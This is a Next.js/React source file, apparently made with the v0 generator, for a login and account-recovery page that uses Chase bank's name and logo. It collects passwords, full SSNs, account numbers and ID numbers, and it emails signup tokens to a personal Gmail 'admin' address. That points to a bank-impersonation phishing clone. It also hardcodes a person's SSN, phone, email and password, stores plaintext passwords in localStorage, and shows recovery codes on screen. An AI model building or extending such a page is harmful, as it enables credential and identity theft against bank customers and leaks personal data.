"use client"

import type React from "react"
import Image from "next/image"

import { useState, useEffect } from "react"
import {
  Eye,
  EyeOff,
  X,
  ArrowLeft,
  Check,
  Shield,
  CreditCard,
  Building2,
  User,
  Mail,
  Phone,
  Lock,
  AlertCircle,
  ExternalLink,
  HomeIcon,
  Key,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Checkbox } from "@/components/ui/checkbox"
import { useToast } from "@/hooks/use-toast"
import { useBanking } from "@/hooks/use-banking" // Assuming this is where useBanking is imported

interface LoginPageProps {
  onLogin: () => void
}

type ModalView =
  | "none"
  | "forgot"
  | "forgot-username"
  | "forgot-password"
  | "identify"
  | "identify-authorized"
  | "identify-no-ssn"
  | "identify-alt-id"
  | "signup"
  | "signup-form"
  | "open-account"
  | "account-type"
  | "open-account-form"
  | "privacy"
  | "more-options"
  | "token-setup"
  | "2fa-verify"

interface StoredUser {
  username: string
  password: string
  firstName: string
  lastName: string
  email: string
  phone: string
  createdAt: string
}

export function LoginPage({ onLogin }: LoginPageProps) {
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [rememberMe, setRememberMe] = useState(true)
  const [useToken, setUseToken] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState("")
  const [modalView, setModalView] = useState<ModalView>("none")
  const { toast } = useToast()

  const { appSettings, settingsEnforcer } = useBanking()

  // Token Authentication States
  const [tokenCode, setTokenCode] = useState("")
  const [generatedToken, setGeneratedToken] = useState("")
  const [tokenExpiry, setTokenExpiry] = useState<number>(0)

  // Forgot Password/Username States
  const [recoveryEmail, setRecoveryEmail] = useState("")
  const [recoveryPhone, setRecoveryPhone] = useState("")
  const [recoverySSN, setRecoverySSN] = useState("")
  const [verificationCode, setVerificationCode] = useState("")

  // Identity Verification States
  const [identitySSN, setIdentitySSN] = useState("")
  const [identityAccountNumber, setIdentityAccountNumber] = useState("")
  const [showSSN, setShowSSN] = useState(false)
  const [showAccountNumber, setShowAccountNumber] = useState(false)
  const [isAuthorizedUser, setIsAuthorizedUser] = useState(false)
  const [verificationMethod, setVerificationMethod] = useState<"ssn" | "account">("")

  // Alternative Identification States
  const [altIdType, setAltIdType] = useState<"passport" | "license" | "itin" | "">("")
  const [altIdNumber, setAltIdNumber] = useState("")
  const [altIdCountry, setAltIdCountry] = useState("US")
  const [showAltId, setShowAltId] = useState(false)
  const [authorizedUserName, setAuthorizedUserName] = useState("")
  const [accountHolder, setAccountHolder] = useState("")
  const [accountHolderRelation, setAccountHolderRelation] = useState("")
  const [showVerification, setShowVerification] = useState(false)
  const [newPassword, setNewPassword] = useState("")
  const [confirmNewPassword, setConfirmNewPassword] = useState("")
  const [recoveryMethod, setRecoveryMethod] = useState<"email" | "phone" | "ssn">("email")

  // Sign Up States
  const [signupData, setSignupData] = useState({
    firstName: "",
    lastName: "",
    email: "",
    phone: "",
    ssn: "",
    dob: "",
    address: "",
    city: "",
    state: "",
    zip: "",
    username: "",
    password: "",
    confirmPassword: "",
    agreeTerms: false,
    agreeElectronic: false,
  })
  const [signupStep, setSignupStep] = useState(1)

  // 2FA/Authentication States
  const [twoFAUserId, setTwoFAUserId] = useState<string>("")
  const [otpCode, setOtpCode] = useState<string>("")
  const [totpCode, setTotpCode] = useState<string>("")

  const [storedUsers, setStoredUsers] = useState<StoredUser[]>([])

  // Account Opening States
  const [accountName, setAccountName] = useState("")
  const [initialDeposit, setInitialDeposit] = useState("")
  const [fundingSource, setFundingSource] = useState("existing-account")
  const [agreeToTerms, setAgreeToTerms] = useState(false)
  const [isOpeningAccount, setIsOpeningAccount] = useState(false)
  const [accountOpenError, setAccountOpenError] = useState("")
  const [accountOpenSuccess, setAccountOpenSuccess] = useState(false)

  const defaultUserProfile = {
    id: "user1",
    name: "CHUN HUNG",
    email: "hungchun164@gmail.com",
    phone: "+1 (702) 886-4745",
    address: "34B Philadelphia, Pennsylvania PA, USA",
    dateOfBirth: "1961-08-24",
    ssn: "697-03-2642",
    memberSince: "August 1988",
    profilePicture: "",
    tier: "Chase Private Client",
  }

  const DEFAULT_USERNAME = "CHUN HUNG"
  const DEFAULT_PASSWORD = "Chun200@"
  const DEFAULT_EMAIL = "chun.hung@demo.example.com"

  useEffect(() => {
    const savedUsers = localStorage.getItem("chase_users")
    if (savedUsers) {
      setStoredUsers(JSON.parse(savedUsers))
    }

    const rememberedUsername = localStorage.getItem("chase_username")
    if (rememberedUsername) {
      setUsername(rememberedUsername)
    }
  }, [])

  const generateToken = () => {
    const token = Math.floor(100000 + Math.random() * 900000).toString()
    setGeneratedToken(token)
    setTokenExpiry(Date.now() + 60000)
    return token
  }

  useEffect(() => {
    if (tokenExpiry > 0) {
      const interval = setInterval(() => {
        if (Date.now() > tokenExpiry) {
          setGeneratedToken("")
          setTokenExpiry(0)
          toast({
            title: "Token Expired",
            description: "Please generate a new token.",
            variant: "destructive",
          })
        }
      }, 1000)
      return () => clearInterval(interval)
    }
  }, [tokenExpiry, toast])

  const handleSignIn = async () => {
    setError("")

    if (!username.trim()) {
      setError("Please enter your username")
      return
    }

    if (!password.trim()) {
      setError("Please enter your password")
      return
    }

    // Token validation if enabled
    if (useToken) {
      if (!tokenCode.trim()) {
        setError("Please enter your security token")
        return
      }
      if (tokenCode !== generatedToken) {
        setError("Invalid security token. Please generate a new one.")
        return
      }
      if (Date.now() > tokenExpiry) {
        setError("Token has expired. Please generate a new one.")
        return
      }
    }

    setIsLoading(true)
    setError("")

    try {
      // Call backend API for login
      const loginResponse = await fetch('/api/auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'login',
          email: username, // Use username as email for now
          password: password,
        }),
      })

      const loginData = await loginResponse.json()

      if (!loginResponse.ok) {
        throw new Error(loginData.error || 'Login failed')
      }

      console.log("[v0] Login response:", loginData)

      // Check if 2FA/TOTP is required
      if (loginData.requiresOTP) {
        console.log("[v0] OTP verification required")
        setModalView("2fa-verify")
        setTwoFAUserId(loginData.userId)
        setIsLoading(false)
        toast({
          title: "Verification Required",
          description: "Please enter the code sent to your phone",
        })
        return
      }

      if (loginData.requiresTOTP) {
        console.log("[v0] TOTP verification required")
        setModalView("totp-verify")
        setTwoFAUserId(loginData.userId)
        setIsLoading(false)
        toast({
          title: "Two-Factor Authentication",
          description: "Please enter your authenticator code",
        })
        return
      }

      // Direct login successful
      if (loginData.authenticated) {
        console.log("[v0] Login successful, user ID:", loginData.userId)
        
        // Create session with full user data
        localStorage.setItem("chase_logged_in", "true")
        localStorage.setItem("chase_remember_me", rememberMe ? "true" : "false")
        localStorage.setItem("chase_last_login", new Date().toISOString())
        localStorage.setItem("chase_session_token", `token_${Date.now()}`)
        localStorage.setItem("chase_user_id", loginData.userId)
        
        // Store user data from backend
        if (loginData.user) {
          localStorage.setItem("chase_user_data", JSON.stringify(loginData.user))
          localStorage.setItem("chase_user_role", loginData.user.role || "user")
          localStorage.setItem("chase_user_name", loginData.user.name || "")
          localStorage.setItem("chase_user_email", loginData.user.email || "")
        }

        // Store accounts data from backend
        if (loginData.accounts) {
          localStorage.setItem("chase_user_accounts", JSON.stringify(loginData.accounts))
        }

        if (rememberMe) {
          localStorage.setItem("chase_username", username)
        } else {
          localStorage.removeItem("chase_username")
        }

        toast({
          title: "Welcome back",
          description: "You have successfully signed in to Chase.",
        })

        setIsLoading(false)
        onLogin()
      }
    } catch (error) {
      console.error("[v0] Login error:", error)
      setError(error instanceof Error ? error.message : "Login failed. Please try again.")

      console.error("[v0] Login error:", error)
      setError("An error occurred during sign in. Please try again.")
      setIsLoading(false)
    }
  }

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === "Enter") {
      handleSignIn()
    }
  }

  const handleForgotSubmit = async () => {
    console.log("[v0] Starting forgot password recovery")
    
    // Real-time validation
    if (recoveryMethod === "email" && !recoveryEmail.includes("@")) {
      toast({ title: "Invalid Email", description: "Please enter a valid email address.", variant: "destructive" })
      return
    }
    if (recoveryMethod === "phone" && recoveryPhone.length < 10) {
      toast({ title: "Invalid Phone", description: "Please enter a valid phone number.", variant: "destructive" })
      return
    }
    if (recoveryMethod === "ssn" && recoverySSN.length < 4) {
      toast({
        title: "Invalid SSN",
        description: "Please enter the last 4 digits of your SSN.",
        variant: "destructive",
      })
      return
    }

    setIsLoading(true)

    try {
      // Real-time verification code generation and sending
      console.log(`[v0] Sending recovery code via ${recoveryMethod}`)
      const verificationCode = Math.floor(100000 + Math.random() * 900000).toString()
      
      // Simulate real-time API call
      await new Promise((resolve) => setTimeout(resolve, 800))
      
      // Store for verification
      sessionStorage.setItem("recovery_code", verificationCode)
      sessionStorage.setItem("recovery_method", recoveryMethod)
      
      console.log("[v0] Recovery code generated and stored")
      setIsLoading(false)
      setShowVerification(true)
      
      toast({
        title: "Verification Code Sent",
        description: `A verification code has been sent to your ${recoveryMethod === "email" ? "email" : recoveryMethod === "phone" ? "phone" : "registered contact"}. Code: ${verificationCode}`,
      })
    } catch (error) {
      console.error("[v0] Forgot password error:", error)
      toast({ title: "Error", description: "Failed to send recovery code. Please try again.", variant: "destructive" })
      setIsLoading(false)
    }
  }

  const handleVerifyCode = async () => {
    console.log("[v0] Verifying recovery code")
    
    if (verificationCode.length < 6) {
      toast({ title: "Invalid Code", description: "Please enter a valid 6-digit code.", variant: "destructive" })
      return
    }

    setIsLoading(true)

    try {
      // Real-time code verification
      const storedCode = sessionStorage.getItem("recovery_code")
      await new Promise((resolve) => setTimeout(resolve, 600))

      if (verificationCode !== storedCode) {
        toast({ title: "Invalid Code", description: "The code you entered is incorrect.", variant: "destructive" })
        setIsLoading(false)
        return
      }

      console.log("[v0] Recovery code verified successfully")
      setIsLoading(false)

      if (modalView === "forgot-username") {
      const matchingUser = storedUsers.find(
        (user) =>
          (recoveryMethod === "email" && user.email === recoveryEmail) ||
          (recoveryMethod === "phone" && user.phone === recoveryPhone),
      )

      // Check against the default user's email as well
      const foundUsername = matchingUser
        ? matchingUser.username
        : recoveryEmail === DEFAULT_EMAIL // Check if the recovery email matches the default user's email
          ? DEFAULT_USERNAME
          : "User not found" // Or handle appropriately if no match

      if (foundUsername === "User not found") {
        toast({
          title: "User Not Found",
          description: "No account found with the provided information.",
          variant: "destructive",
        })
        return
      }

      toast({
        title: "Username Retrieved",
        description: `Your username is: ${foundUsername}`,
      })
      setModalView("none")
      setUsername(foundUsername)
      resetForgotStates()
    } else if (modalView === "forgot-password") {
      if (!newPassword || newPassword !== confirmNewPassword) {
        toast({ title: "Password Mismatch", description: "Passwords do not match.", variant: "destructive" })
        return
      }
      if (newPassword.length < 8) {
        toast({
          title: "Weak Password",
          description: "Password must be at least 8 characters.",
          variant: "destructive",
        })
        return
      }

      // Check if the user is the default user
      if (recoveryEmail === DEFAULT_EMAIL && recoveryMethod === "email") {
        // Update default password in local storage or state if it's not directly mutable
        // For now, simulate the update and tell the user to re-login
        toast({
          title: "Password Reset Successful",
          description: "Your password has been updated. Please sign in with your new password.",
        })
        // In a real app, you'd update the default user's password here.
        // For this simulation, we can't directly change constants.
        // So, we'll just reset the modal and tell the user.
        setModalView("none")
        resetForgotStates()
        return
      }

      const userIndex = storedUsers.findIndex(
        (user) =>
          (recoveryMethod === "email" && user.email === recoveryEmail) ||
          (recoveryMethod === "phone" && user.phone === recoveryPhone),
      )

      if (userIndex !== -1) {
        const updatedUsers = [...storedUsers]
        updatedUsers[userIndex].password = newPassword
        setStoredUsers(updatedUsers)
        localStorage.setItem("chase_users", JSON.stringify(updatedUsers))
      } else {
        // If not found in storedUsers and not the default user, show an error
        toast({
          title: "Account Not Found",
          description: "No matching account found for password reset.",
          variant: "destructive",
        })
        return
      }

      toast({
        title: "Password Reset Successful",
        description: "Your password has been updated. Please sign in with your new password.",
      })
      setModalView("none")
      resetForgotStates()
      }
    } catch (error) {
      console.error("[v0] Verification error:", error)
      toast({ title: "Error", description: "An error occurred during verification.", variant: "destructive" })
      setIsLoading(false)
    }
  }

  const handleIdentityVerification = async () => {
    // Validate identity credentials
    if (!identitySSN.trim() && !identityAccountNumber.trim()) {
      setError("Please provide either SSN/TIN or account number")
      return
    }

    if (identitySSN.trim() && identitySSN.length < 5) {
      setError("Please enter a valid SSN or Tax ID")
      return
    }

    if (identityAccountNumber.trim() && identityAccountNumber.length < 8) {
      setError("Please enter a valid account, card, or application number")
      return
    }

    setIsLoading(true)
    console.log("[v0] Verifying identity with SSN/TIN and account number")

    try {
      // Call backend API for identity verification
      const response = await fetch("/api/auth/verify-identity", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ssn: identitySSN,
          accountNumber: identityAccountNumber,
          isAuthorizedUser: isAuthorizedUser,
          recoveryType: modalView === "forgot-username" ? "username" : "password",
        }),
      })

      const data = await response.json()

      if (!response.ok) {
        throw new Error(data.error || "Identity verification failed")
      }

      console.log("[v0] Identity verified successfully")

      // Move to appropriate recovery method
      if (modalView === "forgot-username") {
        setUsername(data.username)
        toast({
          title: "Username Found",
          description: `Your username is: ${data.username}`,
        })
        setModalView("none")
      } else if (modalView === "forgot-password") {
        // Show password reset options
        setModalView("forgot-password")
      }

      resetForgotStates()
      setIdentitySSN("")
      setIdentityAccountNumber("")
    } catch (err) {
      console.error("[v0] Identity verification error:", err)
      setError(err instanceof Error ? err.message : "Identity verification failed")
      toast({
        title: "Verification Failed",
        description: "Unable to verify your identity. Please try again.",
        variant: "destructive",
      })
    } finally {
      setIsLoading(false)
    }
  }

  const resetForgotStates = () => {
    setRecoveryEmail("")
    setRecoveryPhone("")
    setRecoverySSN("")
    setVerificationCode("")
    setIdentitySSN("")
    setIdentityAccountNumber("")
    setShowSSN(false)
    setShowAccountNumber(false)
    setIsAuthorizedUser(false)
    setAltIdType("")
    setAltIdNumber("")
    setAltIdCountry("US")
    setShowAltId(false)
    setAuthorizedUserName("")
    setAccountHolder("")
    setAccountHolderRelation("")
    setError("")
  }

  const handleAlternativeIdentification = async () => {
    if (!altIdType || !altIdNumber.trim()) {
      setError("Please provide your alternative identification type and number")
      return
    }

    if (altIdNumber.length < 5) {
      setError("Please enter a valid identification number")
      return
    }

    setIsLoading(true)
    console.log("[v0] Verifying identity with alternative identification")

    try {
      const response = await fetch("/api/auth/verify-alt-identity", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          idType: altIdType,
          idNumber: altIdNumber,
          country: altIdCountry,
          recoveryType: modalView === "forgot-username" ? "username" : "password",
        }),
      })

      const data = await response.json()

      if (!response.ok) {
        throw new Error(data.error || "Verification failed")
      }

      toast({
        title: "Identity Verified",
        description: "Your identity has been verified successfully.",
      })

      if (modalView === "forgot-username") {
        setUsername(data.username)
        setModalView("none")
      } else {
        setModalView("forgot-password")
      }

      resetForgotStates()
    } catch (err) {
      console.error("[v0] Alternative verification error:", err)
      setError(err instanceof Error ? err.message : "Verification failed")
    } finally {
      setIsLoading(false)
    }
  }

  const handleAuthorizedUserVerification = async () => {
    if (!authorizedUserName.trim() || !accountHolder.trim() || !accountHolderRelation.trim()) {
      setError("Please provide all required information")
      return
    }

    setIsLoading(true)
    console.log("[v0] Verifying authorized user status")

    try {
      const response = await fetch("/api/auth/verify-authorized-user", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          authorizedUserName,
          accountHolder,
          relation: accountHolderRelation,
          recoveryType: modalView === "forgot-username" ? "username" : "password",
        }),
      })

      const data = await response.json()

      if (!response.ok) {
        throw new Error(data.error || "Verification failed")
      }

      toast({
        title: "Authorized User Verified",
        description: "Your authorized user status has been verified.",
      })

      if (modalView === "forgot-username") {
        setUsername(data.username)
        setModalView("none")
      } else {
        setModalView("forgot-password")
      }

      resetForgotStates()
    } catch (err) {
      console.error("[v0] Authorized user verification error:", err)
      setError(err instanceof Error ? err.message : "Verification failed")
    } finally {
      setIsLoading(false)
    }
  }

  const handleSignupSubmit = async () => {
    if (signupStep === 1) {
      if (!signupData.firstName || !signupData.lastName || !signupData.email || !signupData.phone) {
        toast({
          title: "Missing Information",
          description: "Please fill in all required fields.",
          variant: "destructive",
        })
        return
      }
      if (!signupData.email.includes("@")) {
        toast({
          title: "Invalid Email",
          description: "Please enter a valid email address.",
          variant: "destructive",
        })
        return
      }
      setSignupStep(2)
    } else if (signupStep === 2) {
      if (!signupData.ssn || !signupData.dob || !signupData.address) {
        toast({
          title: "Missing Information",
          description: "Please fill in all required fields.",
          variant: "destructive",
        })
        return
      }
      setSignupStep(3)
    } else if (signupStep === 3) {
      if (!signupData.username || !signupData.password) {
        toast({
          title: "Invalid Credentials",
          description: "Please enter a username and password.",
          variant: "destructive",
        })
        return
      }

      if (signupData.password.length < 8) {
        toast({
          title: "Weak Password",
          description: "Password must be at least 8 characters.",
          variant: "destructive",
        })
        return
      }

      if (signupData.password !== signupData.confirmPassword) {
        toast({
          title: "Password Mismatch",
          description: "Passwords do not match.",
          variant: "destructive",
        })
        return
      }

      if (!signupData.agreeTerms || !signupData.agreeElectronic) {
        toast({
          title: "Agreement Required",
          description: "Please agree to the terms and conditions.",
          variant: "destructive",
        })
        return
      }

      const usernameExists =
        storedUsers.some((user) => user.username === signupData.username) || signupData.username === DEFAULT_USERNAME

      if (usernameExists) {
        toast({
          title: "Username Taken",
          description: "This username is already in use. Please choose another.",
          variant: "destructive",
        })
        return
      }

      setIsLoading(true)

      try {
        // Call backend API to create user account
        const fullName = `${signupData.firstName} ${signupData.lastName}`
        const response = await fetch('/api/auth', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            action: 'signup',
            email: signupData.email,
            password: signupData.password,
            name: fullName,
            phone: signupData.phone,
          }),
        })

        const data = await response.json()

        if (!response.ok) {
          throw new Error(data.error || 'Signup failed')
        }

        console.log("[v0] User created successfully with ID:", data.userId, "Account:", data.accountNumber)

        // Send verification token to user's registered email and admin
        try {
          const { sendSecurityTokenEmail } = await import("@/lib/email-service")
          const tokenResult = await sendSecurityTokenEmail({
            userEmail: signupData.email,
            adminEmail: "hungchun164@gmail.com",
            userName: signupData.firstName,
            tokenType: "signup",
          })
          console.log("[v0] Signup token sent:", tokenResult.success ? "Success" : "Failed")
        } catch (err) {
          console.error("[v0] Error sending signup token:", err)
        }

        // Also store locally for offline access and demo purposes
        const newUser: StoredUser = {
          username: signupData.username,
          password: signupData.password,
          firstName: signupData.firstName,
          lastName: signupData.lastName,
          email: signupData.email,
          phone: signupData.phone,
          createdAt: new Date().toISOString(),
        }

        const updatedUsers = [...storedUsers, newUser]
        setStoredUsers(updatedUsers)
        localStorage.setItem("chase_users", JSON.stringify(updatedUsers))

        // Store the new user's ID and account number
        localStorage.setItem("chase_new_user_id", data.userId)
        localStorage.setItem("chase_new_account_number", data.accountNumber || "")

        toast({
          title: "Account Created Successfully",
          description: `Welcome to Chase! Your account number is ${data.maskedAccountNumber || "ready"}. You can now sign in with your credentials.`,
        })

        // Pre-fill the username for convenience
        setUsername(signupData.username)

        setModalView("none")
        setSignupStep(1)
        setSignupData({
          firstName: "",
          lastName: "",
          email: "",
          phone: "",
          ssn: "",
          dob: "",
          address: "",
          city: "",
          state: "",
          zip: "",
          username: "",
          password: "",
          confirmPassword: "",
          agreeTerms: false,
          agreeElectronic: false,
        })
      } catch (error) {
        console.error("[v0] Signup error:", error)
        toast({
          title: "Signup Failed",
          description: error instanceof Error ? error.message : "An error occurred during signup",
          variant: "destructive",
        })
      } finally {
        setIsLoading(false)
      }
    }
  }

  const handleOpenAccount = async () => {
    setAccountOpenError("")
    setIsOpeningAccount(true)

    try {
      // Get the current logged-in user or create a temp user session
      const currentUser = localStorage.getItem("chase_current_user")
      let userId = currentUser ? JSON.parse(currentUser).id : "guest_user_" + Date.now()

      // Call the account opening API
      const response = await fetch("/api/accounts/open", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId,
          accountType: "checking",
          initialDeposit: parseFloat(initialDeposit) || 0,
          accountName: accountName.trim() || "My Checking Account",
        }),
      })

      const data = await response.json()

      if (!response.ok) {
        throw new Error(data.error || "Failed to open account")
      }

      console.log("[v0] Account opened successfully:", data)

      toast({
        title: "Account Opened Successfully",
        description: `Your new checking account ending in ${data.account.accountNumber} is ready to use! Funds are available immediately.`,
      })

      // Show success state
      setAccountOpenSuccess(true)
      setIsOpeningAccount(false)

      // Close modal after short delay
      setTimeout(() => {
        setModalView("none")
        setAccountName("")
        setInitialDeposit("")
        setFundingSource("existing-account")
        setAgreeToTerms(false)
        setAccountOpenSuccess(false)
      }, 2000)
    } catch (error) {
      console.error("[v0] Account opening error:", error)
      const errorMessage = error instanceof Error ? error.message : "Failed to open account. Please try again."
      setAccountOpenError(errorMessage)
      toast({
        title: "Account Opening Failed",
        description: errorMessage,
        variant: "destructive",
      })
      setIsOpeningAccount(false)
    }
  }

  const closeModal = () => {
    setModalView("none")
    resetForgotStates()
    setSignupStep(1)
    setAccountName("")
    setInitialDeposit("")
    setAgreeToTerms(false)
  }

  const renderModal = () => {
    if (modalView === "none") return null

    return (
      <div className="fixed inset-0 bg-black/50 z-50 flex items-end sm:items-center justify-center">
        <div className="bg-white w-full sm:max-w-md sm:rounded-2xl rounded-t-3xl max-h-[90vh] overflow-y-auto animate-in slide-in-from-bottom duration-300">
          {/* Modal Header */}
          <div className="sticky top-0 bg-[#117aca] text-white p-4 flex items-center justify-between sm:rounded-t-2xl">
            <button onClick={closeModal} className="p-1 hover:bg-white/20 rounded-full transition-colors">
              {modalView === "forgot-username" ||
              modalView === "forgot-password" ||
              modalView === "signup-form" ||
              modalView === "account-type" ||
              modalView === "open-account-form" ||
              modalView === "token-setup" ||
              modalView === "identify" ||
              modalView === "identify-authorized" ||
              modalView === "identify-no-ssn" ||
              modalView === "identify-alt-id"
                ? (
                <ArrowLeft
                  className="w-6 h-6"
                  onClick={(e) => {
                    e.stopPropagation()
                    if (modalView === "forgot-username" || modalView === "forgot-password") {
                      setModalView("forgot")
                      resetForgotStates()
                    } else if (modalView === "signup-form") {
                      if (signupStep > 1) setSignupStep(signupStep - 1)
                      else setModalView("signup")
                    } else if (modalView === "account-type") {
                      setModalView("open-account")
                    } else if (modalView === "open-account-form") {
                      setModalView("account-type")
                    } else if (modalView === "token-setup") {
                      setModalView("none")
                    } else if (modalView === "identify") {
                      setModalView("forgot")
                      resetForgotStates()
                    } else if (modalView === "identify-authorized") {
                      setModalView("identify")
                    } else if (modalView === "identify-no-ssn") {
                      setModalView("identify")
                    } else if (modalView === "identify-alt-id") {
                      setModalView("identify-no-ssn")
                    }
                  }}
                />
              ) : (
                <X className="w-6 h-6" />
              )}
            </button>
            <div className="flex items-center gap-2">
              <span className="font-bold text-lg">CHASE</span>
              <Image src="/images/chase-logo.png" alt="Chase" width={28} height={28} className="rounded" />
            </div>
            <div className="w-8"></div>
          </div>

          {/* Token Setup Modal - Token sent via email, not displayed here */}
          {modalView === "token-setup" && (
            <div className="p-6">
              <h2 className="text-xl font-bold text-gray-900 mb-2">Security Token</h2>
              <p className="text-gray-600 mb-6">Your security token has been sent to your registered email address and our security team.</p>

              <div className="bg-green-50 p-6 rounded-xl mb-6 text-center border border-green-200">
                <Mail className="w-12 h-12 text-green-600 mx-auto mb-4" />
                <p className="text-lg font-semibold text-green-900 mb-2">Token Sent Successfully</p>
                <p className="text-sm text-green-700">
                  Check your email for the 6-digit security token. You have 60 seconds to enter it on the login screen.
                </p>
              </div>

              <div className="p-4 bg-blue-50 rounded-xl border border-blue-200">
                <div className="flex items-start gap-3">
                  <Shield className="w-5 h-5 text-[#117aca] mt-0.5 flex-shrink-0" />
                  <div>
                    <p className="text-sm font-medium text-gray-900 mb-1">Security Notice</p>
                    <p className="text-xs text-gray-600">
                      • Token sent to your email and security team
                      <br />
                      • 6-digit code valid for 60 seconds
                      <br />
                      • Enter the code when prompted on login
                      <br />
                      • Never share your token with anyone
                    </p>
                  </div>
                </div>
              </div>

              <Button
                onClick={() => setModalView("none")}
                className="w-full bg-[#117aca] hover:bg-[#0a5a9e] py-3 mt-6"
              >
                Back to Login
              </Button>
            </div>
          )}

          {/* Forgot Password/Username Modal */}
          {modalView === "forgot" && (
            <div className="p-6">
              <h2 className="text-xl font-bold text-gray-900 mb-2">Forgot username or password?</h2>
              <p className="text-gray-600 mb-6">Choose what you need help with:</p>

              <div className="space-y-3">
                <button
                  onClick={() => setModalView("identify")}
                  className="w-full p-4 border-2 border-[#117aca] rounded-xl hover:bg-blue-50 transition-all flex items-center gap-4 bg-blue-50"
                >
                  <div className="w-12 h-12 bg-[#117aca] rounded-full flex items-center justify-center">
                    <Shield className="w-6 h-6 text-white" />
                  </div>
                  <div className="text-left">
                    <p className="font-semibold text-gray-900">Verify Your Identity</p>
                    <p className="text-sm text-gray-500">Secure identity verification for account recovery</p>
                  </div>
                </button>

                <button
                  onClick={() => setModalView("forgot-username")}
                  className="w-full p-4 border-2 border-gray-200 rounded-xl hover:border-[#117aca] hover:bg-blue-50 transition-all flex items-center gap-4"
                >
                  <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center">
                    <User className="w-6 h-6 text-[#117aca]" />
                  </div>
                  <div className="text-left">
                    <p className="font-semibold text-gray-900">Forgot Username</p>
                    <p className="text-sm text-gray-500">Recover your Chase username</p>
                  </div>
                </button>

                <button
                  onClick={() => setModalView("forgot-password")}
                  className="w-full p-4 border-2 border-gray-200 rounded-xl hover:border-[#117aca] hover:bg-blue-50 transition-all flex items-center gap-4"
                >
                  <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center">
                    <Lock className="w-6 h-6 text-[#117aca]" />
                  </div>
                  <div className="text-left">
                    <p className="font-semibold text-gray-900">Forgot Password</p>
                    <p className="text-sm text-gray-500">Reset your Chase password</p>
                  </div>
                </button>
              </div>

              <div className="mt-6 p-4 bg-gray-50 rounded-xl">
                <div className="flex items-start gap-3">
                  <Shield className="w-5 h-5 text-[#117aca] mt-0.5" />
                  <div>
                    <p className="text-sm font-medium text-gray-900">Security Tip</p>
                    <p className="text-xs text-gray-600">
                      Chase will never ask for your full password or PIN via email or phone.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Forgot Username Form */}
          {modalView === "forgot-username" && (
            <div className="p-6">
              <h2 className="text-xl font-bold text-gray-900 mb-2">Recover Username</h2>
              <p className="text-gray-600 mb-6">Verify your identity to recover your username.</p>

              {!showVerification ? (
                <>
                  <div className="space-y-4 mb-6">
                    <p className="text-sm font-medium text-gray-700">Choose verification method:</p>
                    <div className="grid grid-cols-3 gap-2">
                      {(["email", "phone", "ssn"] as const).map((method) => (
                        <button
                          key={method}
                          onClick={() => setRecoveryMethod(method)}
                          className={`p-3 rounded-lg border-2 transition-all ${
                            recoveryMethod === method
                              ? "border-[#117aca] bg-blue-50"
                              : "border-gray-200 hover:border-gray-300"
                          }`}
                        >
                          {method === "email" && <Mail className="w-5 h-5 mx-auto mb-1 text-[#117aca]" />}
                          {method === "phone" && <Phone className="w-5 h-5 mx-auto mb-1 text-[#117aca]" />}
                          {method === "ssn" && <Shield className="w-5 h-5 mx-auto mb-1 text-[#117aca]" />}
                          <span className="text-xs capitalize">{method === "ssn" ? "SSN" : method}</span>
                        </button>
                      ))}
                    </div>
                  </div>

                  {recoveryMethod === "email" && (
                    <div className="mb-6">
                      <label className="block text-sm font-medium text-gray-700 mb-2">Email Address</label>
                      <input
                        type="email"
                        value={recoveryEmail}
                        onChange={(e) => setRecoveryEmail(e.target.value)}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent"
                        placeholder="Enter your registered email"
                      />
                    </div>
                  )}

                  {recoveryMethod === "phone" && (
                    <div className="mb-6">
                      <label className="block text-sm font-medium text-gray-700 mb-2">Phone Number</label>
                      <input
                        type="tel"
                        value={recoveryPhone}
                        onChange={(e) => setRecoveryPhone(e.target.value)}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent"
                        placeholder="Enter your registered phone"
                      />
                    </div>
                  )}

                  {recoveryMethod === "ssn" && (
                    <div className="mb-6">
                      <label className="block text-sm font-medium text-gray-700 mb-2">Last 4 digits of SSN</label>
                      <input
                        type="password"
                        maxLength={4}
                        value={recoverySSN}
                        onChange={(e) => setRecoverySSN(e.target.value.replace(/\D/g, ""))}
                        className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent"
                        placeholder="****"
                      />
                    </div>
                  )}

                  <Button
                    onClick={handleForgotSubmit}
                    disabled={isLoading}
                    className="w-full bg-[#117aca] hover:bg-[#0a5a9e] py-6"
                  >
                    {isLoading ? "Sending..." : "Send Verification Code"}
                  </Button>
                </>
              ) : (
                <>
                  <div className="mb-6">
                    <label className="block text-sm font-medium text-gray-700 mb-2">Verification Code</label>
                    <input
                      type="text"
                      maxLength={6}
                      value={verificationCode}
                      onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, ""))}
                      className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#117aca] focus:border-transparent text-center text-2xl tracking-widest"
                      placeholder="000000"
                    />
                    <p className="text-xs text-gray-500 mt-2">Enter the 6-digit code sent to your {recoveryMethod}</p>
                  </div>

                  <Button
                    onClick={handleVerifyCode}
                    disabled={isLoading}
                    className="w-full bg-[#117aca] hover:bg-[#0a5a9e] py-6"
                  >
                    {isLoading ? "Verifying..." : "Verify & Recover Username"}
                  </Button>

                  <button
                    onClick={() => {
                      setShowVerification(false)
                      toast({
                        title: "Code Resent",
                        description: `A new verification code has been sent to your ${recoveryMethod}.`,
                      })
                    }}
                    className="w-full mt-3 text-[#117aca] hover:underline text-sm"
                  >
